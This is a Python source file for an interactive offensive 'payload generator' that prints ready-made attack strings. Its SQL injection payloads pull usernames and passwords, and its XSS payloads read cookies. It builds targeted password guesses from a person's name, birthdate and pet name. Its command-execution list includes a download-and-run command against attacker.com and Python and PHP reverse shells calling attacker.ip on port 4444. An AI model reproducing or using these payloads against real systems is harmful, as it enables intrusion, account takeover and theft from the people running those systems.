import os
import sys
import json
import random
import itertools
import math
from datetime import datetime
from typing import List, Dict, Any
from prettytable import PrettyTable

class AdvancedPayloadGenerator:
    def __init__(self):
        """
        Advanced Secure Payload Generation Framework
        Developed by Anubhav Mohandas
        Comprehensive Vulnerability Exploitation Toolkit
        """
        self.payload_types = [
            'password_bruteforce',
            'sql_injection',
            'xss',
            'rce',
            'ldap_injection',
            'command_injection',
            'deserialization',
            'xxe',
            'ssrf',
            'oauth_token_bypass'
        ]
        
        self.payload_storage = {
            type: [] for type in self.payload_types
        }
        
        # Advanced config and dictionaries
        self.config = {
            'max_payload_length': 1024,
            'entropy_threshold': 3.5,
            'mutation_rate': 0.3
        }
        
        # Advanced dictionaries
        self.dictionaries = {
            'common_passwords': [],
            'tech_keywords': [],
            'company_names': [],
            'programming_languages': []
        }
        
        self.load_dictionaries()
        
    def load_dictionaries(self):
        """
        Load comprehensive dictionaries for advanced payload generation
        """
        dictionary_path = os.path.join(os.path.dirname(__file__), 'dictionaries')
        
        dictionary_files = {
            'common_passwords': 'passwords.txt',
            'tech_keywords': 'tech_keywords.txt',
            'company_names': 'companies.txt',
            'programming_languages': 'languages.txt'
        }
        
        for key, filename in dictionary_files.items():
            try:
                with open(os.path.join(dictionary_path, filename), 'r') as f:
                    self.dictionaries[key] = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"Warning: Dictionary {filename} not found. Using minimal built-in list.")
                self.dictionaries[key] = self._generate_minimal_dictionary(key)
    
    def _generate_minimal_dictionary(self, dictionary_type):
        """
        Generate minimal dictionary if file is not found
        """
        minimal_dicts = {
            'common_passwords': [
                'password123', 'admin', 'welcome', 'password', 
                '123456', 'qwerty', 'letmein', 'dragon'
            ],
            'tech_keywords': [
                'database', 'server', 'cloud', 'network', 
                'security', 'authentication', 'encryption'
            ],
            'company_names': [
                'Google', 'Microsoft', 'Amazon', 'Apple', 
                'Facebook', 'Twitter', 'LinkedIn'
            ],
            'programming_languages': [
                'python', 'java', 'javascript', 'c++', 
                'ruby', 'php', 'golang'
            ]
        }
        return minimal_dicts.get(dictionary_type, [])
    
    def generate_advanced_password_payloads(self, personal_info: Dict[str, Any] = None) -> List[str]:
        """
        Advanced password payload generation with contextual and probabilistic mutations
        """
        if personal_info is None:
            # Prompt user for personal information if not provided
            personal_info = {
                'first_name': input("Enter first name: "),
                'last_name': input("Enter last name: "),
                'birthdate': input("Enter birthdate (YYYYMMDD): "),
                'pet_name': input("Enter pet name: "),
                'company': input("Enter company name: ")
            }
        
        base_words = [
            personal_info.get('first_name', ''),
            personal_info.get('last_name', ''),
            personal_info.get('birthdate', ''),
            personal_info.get('pet_name', ''),
            personal_info.get('company', '')
        ]
        
        password_payloads = []
        
        # Probabilistic Mutations
        for word in base_words:
            if not word:
                continue
            
            mutations = [
                word,
                word.lower(),
                word.upper(),
                word.capitalize(),
                word + '!',
                word + '@',
                word + '123',
                word + '!@#',
                '123' + word,
                word + str(random.randint(1900, 2024))
            ]
            
            password_payloads.extend(mutations)
        
        # Advanced Dictionary Enrichment
        password_payloads.extend(self.dictionaries['common_passwords'])
        
        # Contextual Combination
        for word1, word2 in itertools.combinations(base_words, 2):
            if not word1 or not word2:
                continue
            
            combined_words = [
                word1 + word2,
                word2 + word1,
                word1 + '_' + word2,
                word1 + str(random.randint(1, 999))
            ]
            
            password_payloads.extend(combined_words)
        
        # Remove duplicates and apply advanced entropy filter
        unique_payloads = list(set(password_payloads))
        self.payload_storage['password_bruteforce'] = [
            payload for payload in unique_payloads 
            if self._calculate_entropy(payload) >= self.config['entropy_threshold']
        ]
        
        return self.payload_storage['password_bruteforce']
    
    def _calculate_entropy(self, password: str) -> float:
        """
        Calculate password entropy for complexity assessment
        """
        char_set = set(password)
        entropy = len(password) * math.log2(len(char_set))
        return entropy
    
    def generate_advanced_sql_injection(self) -> List[str]:
        """
        Advanced SQL Injection Payload Generation
        """
        # Prompt for SQL Injection specific context
        print("\nSQL Injection Payload Generation:")
        database_type = input("Enter database type (e.g., MySQL, PostgreSQL): ")
        authentication_method = input("Enter authentication method (e.g., login, search): ")
        
        base_injections = [
            "' OR '1'='1",
            "1' UNION SELECT NULL, NULL, version()--",
            "admin' --",
            "1 OR 1=1--",
            "'UNION ALL SELECT NULL, NULL, CONCAT(username,0x3a,password) FROM users--"
        ]
        
        # Advanced Blind SQL Injection Techniques
        blind_sql_payloads = [
            "1' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0--",
            "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 100--",
            "1 OR SUBSTR((SELECT version()),1,1) = '5'--"
        ]
        
        # Time-Based Blind SQL Injection
        time_based_payloads = [
            "1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1) = 'a', SLEEP(5), 0)--",
            "1 OR IF(DATABASE() LIKE '%security%', SLEEP(5), 0)--"
        ]
        
        self.payload_storage['sql_injection'] = list(set(
            base_injections + blind_sql_payloads + time_based_payloads
        ))
        
        return self.payload_storage['sql_injection']
    
    def generate_advanced_rce_payloads(self) -> List[str]:
        """
        Remote Code Execution (RCE) Payload Generation
        """
        # Prompt for RCE specific context
        print("\nRemote Code Execution Payload Generation:")
        os_type = input("Enter target operating system (e.g., Linux, Windows): ")
        programming_language = input("Enter programming language (e.g., Python, PHP): ")
        
        rce_payloads = [
            r"$(whoami)",
            r"`id`",
            r"system('ls')",
            r"eval('__import__(\'os\').system(\'id\')')",
            r"import os; os.system('whoami')",
            r"process.platform",
            r"__import__('subprocess').check_output(['ls'])",
            r"echo PAYLOAD | base64 -d | bash"
        ]
        
        # Advanced OS Command Injection
        os_specific_payloads = [
            r"$(curl http://attacker.com/malware | bash)",
            r"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.ip\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            r"php -r '$sock=fsockopen(\"attacker.ip\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ]
        
        self.payload_storage['rce'] = list(set(rce_payloads + os_specific_payloads))
        return self.payload_storage['rce']
    
    def generate_xss_payloads(self) -> List[str]:
        """
        Cross-Site Scripting (XSS) Payload Generation
        """
        # Prompt for XSS specific context
        print("\nCross-Site Scripting (XSS) Payload Generation:")
        context = input("Enter context (e.g., input field, URL parameter): ")
        
        xss_payloads = [
            r"<script>alert('XSS')</script>",
            r"javascript:alert('XSS')",
            r"<img src=x onerror=alert('XSS')>",
            r"'><script>alert(document.cookie)</script>",
            r"<svg onload=alert('XSS')>",
            r"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/=[].constructor.constructor(alert())//'>",
        ]
        
        # Contextual XSS Payloads
        contextual_xss_payloads = [
            fr"{context}><script>alert('XSS in {context}')</script>",
            fr"'\"{context}><script>alert(document.cookie)</script>",
        ]
        
        self.payload_storage['xss'] = list(set(xss_payloads + contextual_xss_payloads))
        return self.payload_storage['xss']
    
    def generate_payload(self, payload_type: str) -> List[str]:
        """
        Generate payloads based on selected type
        """
        payload_generators = {
            'password_bruteforce': self.generate_advanced_password_payloads,
            'sql_injection': self.generate_advanced_sql_injection,
            'rce': self.generate_advanced_rce_payloads,
            'xss': self.generate_xss_payloads
        }
        
        if payload_type not in payload_generators:
            print(f"Payload type {payload_type} not supported.")
            return []
        
        return payload_generators[payload_type]()

def print_colorful_banner():
    """
    Print a colorful banner for the Secure Payload Generator
    """
    banner = """
\033[1;34m╔══════════════════════════════════════════════════╗
\033[1;36m║   🛡️  Secure Gen Payload Generator  🔒         ║
\033[1;34m╟──────────────────────────────────────────────────╢
\033[1;33m║ Advanced Security Vulnerability Assessment Tool  ║
\033[1;32m║ Developed by Anubhav Mohandas                    ║
\033[1;34m╚══════════════════════════════════════════════════╝
\033[0m
"""
    print(banner)

def display_menu():
    """
    Display menu of payload generation options
    """
    print("\033[1;36m[*] Select Payload Type:\033[0m")
    options = [
        "1. Password Bruteforce",
        "2. SQL Injection",
        "3. Remote Code Execution (RCE)",
        "4. Cross-Site Scripting (XSS)",
        "5. Exit"
    ]
    
    for option in options:
        print(option)
    
    return input("\033[1;35mEnter your choice (1-5): \033[0m")

def main():
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Print colorful banner
    print_colorful_banner()
    
    # Create generator instance
    generator = AdvancedPayloadGenerator()
    
    while True:
        # Display menu and get user choice
        choice = display_menu()
        
        try:
            if choice == '1':
                payload_type = 'password_bruteforce'
            elif choice == '2':
                payload_type = 'sql_injection'
            elif choice == '3':
                payload_type = 'rce'
            elif choice == '4':
                payload_type = 'xss'
            elif choice == '5':
                print("\033[1;33m[*] Exiting Payload Generator. Stay Secure!\033[0m")
                break
            else:
                print("\033[1;31m[!] Invalid choice. Please try again.\033[0m")
                continue
            
            if choice != '5':
                # Generate payloads
                print(f"\n\033[1;35m[*] Generating {payload_type.replace('_', ' ').title()} Payloads...\033[0m")
                payloads = generator.generate_payload(payload_type)
                
                # Display generated payloads
                print("\n\033[1;32m[+] Generated Payloads:\033[0m")
                for i, payload in enumerate(payloads, 1):
                    print(f"{i}. {payload}")
                
                # Optional: Save payloads to a file
                save_choice = input("\n\033[1;36mDo you want to save these payloads to a file? (y/n): \033[0m").lower()
                if save_choice == 'y':
                    filename = f"{payload_type}_payloads.txt"
                    with open(filename, 'w') as f:
                        for payload in payloads:
                            f.write(payload + '\n')
                    print(f"\033[1;32m[+] Payloads saved to {filename}\033[0m")
                
                input("\n\033[1;33mPress Enter to continue...\033[0m")
        
        except Exception as e:
            print(f"\033[1;31m[!] An error occurred: {e}\033[0m")

if __name__ == "__main__":
    try:
        # Requires PrettyTable for tabular display
        main()
    except ImportError:
        print("Please install required libraries: pip install prettytable")
        sys.exit(1)